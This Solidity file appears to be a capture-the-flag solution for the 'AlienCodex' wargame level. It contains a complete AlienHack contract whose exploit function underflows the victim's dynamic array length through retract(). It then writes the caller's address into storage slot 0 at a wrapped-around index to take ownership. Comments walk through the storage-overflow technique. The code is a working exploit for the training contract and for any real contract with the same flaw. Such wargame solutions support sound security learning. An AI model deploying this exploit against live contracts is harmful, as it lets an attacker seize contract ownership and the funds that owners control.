// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./AlienCodex.sol";

contract AlienHack {
    AlienCodex public victim;

    constructor(AlienCodex victim_) public {
        victim = victim_;
    }

    //exploit - every contract has storage like an array of 2**256 (indexing from 0 to 2**256 - 1) slots of 32 byte each.
    function exploit() external {
        //take storage position of dynamic array elements (keccak256 of its slot)
        //index = last positon of contract storage  + overflow by 1
        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        bytes32 myAddress = bytes32(uint256(uint160(msg.sender))); //'0x000000000000000000000000<20-byte-player-address>'

        victim.makeContact();
        victim.retract(); //make array length to max with overflow
        victim.revise(index, myAddress); // rewrite slot 0 - owner address (storage space overflow)
    }
}